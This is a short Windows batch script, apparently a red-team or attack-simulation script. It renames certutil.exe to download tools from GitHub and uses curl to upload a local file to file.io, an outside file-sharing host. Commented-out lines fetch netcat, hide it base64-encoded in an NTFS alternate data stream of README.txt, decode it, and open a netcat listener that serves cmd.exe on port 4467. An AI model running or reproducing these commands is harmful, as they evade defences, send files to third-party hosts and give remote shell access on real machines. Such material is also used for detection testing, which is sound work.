@echo on
copy %windir%\system32\certutil.exe %temp%\cr.tmp

%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/curl.exe %Temp%\curl.exe
rem copy %USERPROFILE%\Downloads\mim C:\mimtoextract

powershell.exe %Temp%\curl.exe -k -F 'file=@C:\Windows\notepad.exe' https://file.io > %Temp%\results.txt
copy %Temp%\results.txt C:\results.txt

rem %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe

rem %temp%\cr.tmp -encode %Temp%\nc.exe %Temp%\nc.txt

rem type %Temp%\nc.txt > %Temp%\README.txt:hid.txt
rem %temp%\cr.tmp -decode %Temp%\README.txt:hid.txt %Temp%\nc64.exe

rem %temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%\7z.exe

rem %Temp%\nc64.exe -nLvp 4467 -e cmd.exe



